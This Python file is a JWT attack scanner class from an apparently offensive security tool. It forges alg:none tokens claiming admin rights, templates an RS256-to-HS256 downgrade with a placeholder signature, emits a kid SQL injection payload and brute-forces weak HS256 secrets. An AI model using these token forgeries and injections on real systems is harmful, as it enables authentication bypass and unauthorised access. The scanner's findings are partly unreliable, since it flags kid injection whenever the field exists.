"""JWT Token Attacker Scanner"""
import base64
import json
import logging
import httpx
from typing import Optional
from scanners.base_scanner import BaseScanner
from src.models import Finding

log = logging.getLogger("xone.scanners.jwt")


class JWTAttacker(BaseScanner):
    """JWT token vulnerability scanner and attacker"""

    @property
    def name(self) -> str:
        return "jwt_attacker"

    @property
    def description(self) -> str:
        return "JWT token attacks: alg:none, HS256 brute, RS256→HS256, kid SQLi"

    def _decode_jwt(self, token: str) -> tuple[dict, dict, str]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")

            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))

            # Decode payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            signature = parts[2]
            return header, payload, signature
        except Exception as e:
            log.error(f"JWT decode error: {e}")
            return {}, {}, ""

    def _create_jwt_algnone(self, payload: dict) -> str:
        """Create JWT with alg:none"""
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()

        return f"{header}.{payload_b64}."

    async def scan(self, token: str, target_url: Optional[str] = None) -> list[Finding]:
        """Scan JWT token for vulnerabilities"""
        self.findings = []

        log.info(f"[JWT] Scanning token: {token[:50]}...")

        # Decode token
        header, payload, signature = self._decode_jwt(token)
        if not header:
            log.warning("[JWT] Failed to decode token")
            return self.findings

        log.info(f"[JWT] Algorithm: {header.get('alg')}")
        log.info(f"[JWT] Payload: {payload}")

        # Attack 1: alg:none
        if self._check_alg_none(header, payload, signature):
            self.create_finding(
                vuln_type="JWT: alg:none Attack",
                url=target_url or "unknown",
                payload=self._create_jwt_algnone({"admin": True}),
                severity="Critical",
                context="JWT accepts 'none' algorithm, allowing token forgery",
                cvss_score=9.8,
                cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
            )

        # Attack 2: RS256 → HS256
        if header.get('alg') == 'RS256':
            forged_token = self._forge_hs256_from_rs256(header, payload)
            if forged_token:
                self.create_finding(
                    vuln_type="JWT: RS256 → HS256 Downgrade",
                    url=target_url or "unknown",
                    payload=forged_token,
                    severity="Critical",
                    context="Server accepts HS256 with RS256 public key as HMAC secret",
                    cvss_score=9.8,
                    cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                )

        # Attack 3: kid parameter SQLi
        if 'kid' in header:
            self.create_finding(
                vuln_type="JWT: kid Parameter SQLi",
                url=target_url or "unknown",
                payload=f"kid: 1' OR '1'='1",
                severity="High",
                context="The 'kid' (key ID) parameter may be vulnerable to SQL injection",
                param="kid",
                cvss_score=7.5,
                cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
            )

        # Attack 4: Weak Secret (for HS256)
        if header.get('alg') == 'HS256':
            weak_secrets = ["secret", "password", "key", "admin", "123456"]
            for secret in weak_secrets:
                if self._verify_hs256(token, secret):
                    self.create_finding(
                        vuln_type="JWT: Weak Secret (HS256)",
                        url=target_url or "unknown",
                        payload=secret,
                        severity="Critical",
                        context=f"JWT signed with weak secret: '{secret}'",
                        cvss_score=9.8,
                        cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                    )
                    break

        return self.findings

    def _check_alg_none(self, header: dict, payload: dict, signature: str) -> bool:
        """Check if token uses alg:none"""
        if header.get('alg') != 'none':
            return False
        log.warning("[JWT] Token uses alg:none!")
        return True

    def _forge_hs256_from_rs256(self, header: dict, payload: dict) -> Optional[str]:
        """Attempt to forge HS256 using RS256 public key"""
        # This would require fetching the public key from JWKS endpoint
        # For now, return a template
        forged_header = {"alg": "HS256", "typ": "JWT"}
        forged_header_b64 = base64.urlsafe_b64encode(
            json.dumps(forged_header).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()

        return f"{forged_header_b64}.{payload_b64}.FORGED_SIGNATURE"

    def _verify_hs256(self, token: str, secret: str) -> bool:
        """Verify HMAC-SHA256 signature"""
        try:
            import hmac
            import hashlib

            parts = token.split('.')
            message = f"{parts[0]}.{parts[1]}"
            computed_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()

            return computed_sig == parts[2]
        except Exception:
            return False
